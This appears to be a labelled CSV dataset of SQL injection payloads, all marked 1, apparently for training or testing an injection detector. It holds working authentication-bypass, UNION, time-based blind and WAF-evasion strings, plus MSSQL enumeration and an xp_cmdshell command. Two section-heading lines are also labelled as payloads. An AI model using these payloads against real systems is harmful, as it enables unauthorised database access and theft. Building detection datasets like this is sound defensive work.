payload,label
',1
"""",1
'--,1
' #,1
'/*,1
' OR '1'='1,1
' OR 1=1--,1
' OR 1=1#,1
""" OR ""1""=""1",1
""" OR 1=1--",1
""" OR 1=1#",1
admin'--,1
admin' #,1
admin'/*,1
' UNION SELECT NULL--,1
"' UNION SELECT NULL,NULL--",1
"' UNION SELECT NULL,NULL,NULL--",1
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,1
' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,1
' AND 1=(SELECT COUNT(*) FROM tablename)--,1
' OR 1=1 LIMIT 1--,1
' OR 1=1 LIMIT 1 OFFSET 1--,1
"' GROUP BY 1,2,3--",1
' ORDER BY 1--,1
' ORDER BY 2--,1
' ORDER BY 10--,1
'); WAITFOR DELAY '0:0:5'--,1
'); SELECT PG_SLEEP(5)--,1
' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)=',1
' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)='1,1
1' AND 1=1,1
1' AND 1=2,1
"1"" AND 1=1",1
"1"" AND 1=2",1
' OR TRUE--,1
""" OR TRUE--",1
' OR 1=1/*,1
' OR 'a'='a,1
' OR 'a'='b,1
' OR 1=1 LIMIT 1,1
' OR 1=1;--,1
' OR 1=1;#,1
' OR 1=1;/*,1
') OR ('1'='1,1
') OR ('1'='1'--,1
') OR ('1'='1'#,1
') OR ('1'='1'/*,1
') OR '1'='1,1
') OR '1'='1'--,1
') OR '1'='1'#,1
') OR '1'='1'/*,1
""" OR ""1""=""1""--",1
""" OR ""1""=""1""#",1
""" OR ""1""=""1""/*",1
""" OR 1=1",1
""" OR 1=1/*",1
""" OR 1=1;--",1
""" OR 1=1;#",1
""" OR 1=1;/*",1
""") OR (""1""=""1",1
""") OR (""1""=""1""--",1
""") OR (""1""=""1""#",1
""") OR (""1""=""1""/*",1
""") OR ""1""=""1",1
""") OR ""1""=""1""--",1
""") OR ""1""=""1""#",1
""") OR ""1""=""1""/*",1
# Polyglots,1
"SLEEP(5) /*' or SLEEP(5) or '"" or SLEEP(5) or ""*/",1
' OR 1=1 --,1
""" OR 1=1 --",1
' OR '1'='1' { % / * / },1
# WAF Bypass & Encoding,1
%27%20OR%201%3D1--,1
0x61646d696e,1
"CHAR(39,79,82,39,49,39,61,39,49)",1
'/**/OR/**/1=1--,1
'OR%091=1--,1
'OR%0a1=1--,1
'OR%0b1=1--,1
'OR%0c1=1--,1
'OR%0d1=1--,1
'OR%a01=1--,1
'#,1
'-- -,1
"' UNION SELECT 1,2,3--",1
"' UNION SELECT @@VERSION,2,3--",1
"' UNION SELECT version(),2,3--",1
"{""id"": ""1' OR 1=1--""}",1
"SELECT @@VERSION, SUSER_SNAME(), DB_NAME();",1
SELECT name FROM sysobjects WHERE xtype = 'U';,1
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users');,1
EXEC xp_cmdshell 'whoami';,1
WAITFOR DELAY '0:0:5';,1
' AND 1=1--,1
' AND 1=2--,1
